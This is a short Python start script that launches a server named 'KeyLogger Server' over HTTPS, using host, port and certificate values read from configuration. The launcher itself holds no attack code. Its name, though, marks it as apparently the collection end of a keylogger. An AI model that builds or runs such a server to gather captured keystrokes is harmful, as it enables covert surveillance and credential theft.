#!/usr/bin/env python3
"""
Start script for the KeyLogger Server
"""
import os
import sys
from src.main import create_app

# Add the src directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

app = create_app()

if __name__ == '__main__':
    config = app.config['CONFIG']
    ssl_context = (
        config['server']['ssl_cert'],
        config['server']['ssl_key']
    )
    
    print(f"Starting KeyLogger Server on {config['server']['host']}:{config['server']['port']}")
    
    app.run(
        host=config['server']['host'],
        port=config['server']['port'],
        debug=config['server']['debug'],
        ssl_context=ssl_context
    )